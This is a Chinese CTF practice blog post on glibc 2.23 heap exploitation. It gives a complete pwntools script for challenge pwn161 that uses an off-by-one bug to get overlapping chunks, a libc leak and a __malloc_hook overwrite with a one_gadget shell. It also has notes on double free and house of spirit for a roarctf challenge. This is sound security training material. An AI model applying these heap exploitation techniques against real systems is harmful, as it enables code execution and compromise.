---
title: 刷题 heap
date: 2025-3-13 00:00:00 +0800
categories: [Blog, pwn]
tags: [pwn]
---

### pwn161

glibc 2.23

通过代码审计发现edit函数中当输入size - chunk_size = 10时，可以触发offbyone漏洞多读入1字节。

通过off by one，可以造成堆块重叠，进而可以打unsorted bin leak泄露malloc_hook地址 & libc基址

后续打fast bin attack可以劫持malloc hook

```python
import LibcSearcher
from pwn import *
from LibcSearcher import *
context(arch='amd64', os='linux',log_level='debug')

local = 0
if local == 0:
    io = remote("pwn.challenge.ctf.show",28259)
else:
    io = gdb.debug('./pwn', 'b *$rebase(0xc5e)')

elf = ELF('./pwn')

libc = ELF('/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

def add(size):
    io.sendlineafter("Choice",b'1')
    io.sendlineafter("size",str(size))

def edit(index, size, content):
    io.sendlineafter("Choice",b'2')
    io.sendlineafter("index",str(index))
    io.sendlineafter("size",str(size))
    io.sendlineafter("content",content)

def free(index):
    io.sendlineafter("Choice",b'3')
    io.sendlineafter("index",str(index))

def show(index):
    io.sendlineafter("Choice",b'4')
    io.sendlineafter("index",str(index))

add(0x18) #0
add(0x10) #1
add(0x100) #2
add(0x10) #3 防止被合并
edit(0, 0x18+10, cyclic(0x18) + b'\x51') #此时chunk1 size = 0x51
edit(2, 0x30,cyclic(0x20) + p64(0) + p64(0x21))
free(1) #chunk1 进入fast bin free时会对next chunk的size位检查
add(0x40) #申请到chunk1
edit(1, 0x20, b'\x00'*0x10 + p64(0) + p64(0x111))
free(2)
show(1)
io.recvuntil(b'content: ')
io.recv(32)
unsorted_bin = u64(io.recv(6).ljust(8, b'\x00'))
malloc_hook = unsorted_bin - 0x68
libc_base = malloc_hook - libc.sym['__malloc_hook']
ogg = libc_base + 0x4527a
print(hex(unsorted_bin))

add(0x100) #申请到chunk2
payload = cyclic(0x60) + p64(0) + p64(0x71)
edit(2, len(payload), payload) #为fastbin attack做准备 进入fast bin free时会对next chunk的size位检查
edit(1, 0x20,b'\x00'*0x10 + p64(0) + p64(0x71))
free(2)
payload = cyclic(0x10) + p64(0) + p64(0x71) + p64(malloc_hook-0x23) #fd
edit(1,len(payload),payload)
add(0x60) #2
pause()
add(0x60) #申请到malloc_hook处 4
payload = cyclic(0x13) + p64(ogg)
edit(4, len(payload), payload)
add(0x10)
io.interactive()
```

- 堆块重叠构造fake chunk时，对其进行free进入fastbin时会check next chunk的size位进行检查，所以需要注意构造
- 申请fastbin中的chunk时也会对chunk size进行check，所以一定要符合对应fast bin大小
- b *$rebase(offset) 可以在开启PIE偏移情况下打断点
- 进行堆块重叠操作之前注意规避consolidate(添加gap)
- calloc会清空chunk内容，其底层依旧是调用malloc

### roarctf 2019 easyheap (double free/house of spirit)

glibc 2.23

没有edit功能造成了很大的不便

实现double free的精髓在于通过切割unsorted bin中的chunk进入fast bin中

```python

```

- 完成double free的适用情况： fast bin中有两个不同chunk，且其中一个存在UAF
- 申请到malloc hook - 0x23是因为该处刚好有0x7f/0x7a作为首地址。经过观察与测设，该地址附近没有以0x6*、0x5*等其他首地址作为size利用的可能，所以当使用fast bin attack劫持malloc hook时，一定要注意bin大小为0x60，才能成功申请
- 在做这道题踩坑的同时发现，当没有edit功能却能够在malloc时修改chunk的情况下，通过对fast bin中fd修改为环，自身指向自身能够做到用malloc替代edit，做法就是一直malloc一直edit

